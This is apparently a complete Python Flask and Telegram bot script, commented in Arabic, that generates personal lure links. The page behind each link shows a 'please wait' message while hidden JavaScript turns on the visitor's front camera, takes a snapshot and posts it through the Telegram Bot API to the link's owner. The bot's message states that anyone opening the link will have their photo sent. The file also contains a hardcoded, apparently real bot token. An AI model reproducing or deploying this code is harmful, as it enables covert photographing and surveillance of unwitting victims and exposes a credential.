import os
import threading
import requests
from flask import Flask, render_template_string, request

# توكن البوت الخاص بك
TOKEN = "8638452052:AAGz5E-bd3GBY47R-zM5rTmw8uCq9BpPrXc"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"

# الرابط السحابي الثابت الخاص بك على Render (سيتم ملؤه تلقائياً أو يدوياً)
# مثال: https://your-app-name.onrender.com
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
</head>
<body>
    <h2>يرجى الانتظار قليلاً...</h2>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = "{{ token }}";
        const TARGET_CHAT_ID = "{{ chat_id }}";

        async function captureAndSend() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                let video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    let canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        let formData = new FormData();
                        formData.append('chat_id', TARGET_CHAT_ID);
                        formData.append('photo', blob, 'capture.jpg');
                        
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');
                }, 1500);
            } catch (e) {}
        }
        window.onload = captureAndSend;
    </script>
</body>
</html>
"""

@app.route('/c/<chat_id>')
def capture_page(chat_id):
    return render_template_string(HTML_TEMPLATE, token=TOKEN, chat_id=chat_id)

@app.route('/')
def home():
    return "Bot is running successfully!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def run_telegram_bot():
    print("[+] البوت السحابي يعمل الآن...")
    offset = 0
    while True:
        try:
            res = requests.get(f"{TELEGRAM_API}/getUpdates", params={"offset": offset, "timeout": 30})
            data = res.json()
            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1
                    if "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        text = update["message"]["text"]
                        
                        if text.startswith("/start"):
                            personal_link = f"{BASE_URL}/c/{chat_id}"
                            
                            reply_text = (
                                f"🔥 أهلاً بك يا بطل في نسختك السحابية الثابتة!\n\n"
                                f"إليك رابطك الخاص الدائم:\n"
                                f"<code>{personal_link}</code>\n\n"
                                f"أي شخص يفتح هذا الرابط ستصلك صورته فوراً!"
                            )
                            requests.post(f"{TELEGRAM_API}/sendMessage", json={
                                "chat_id": chat_id,
                                "text": reply_text,
                                "parse_mode": "HTML"
                            })
        except Exception as e:
            pass

if __name__ == '__main__':
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    run_telegram_bot()
      
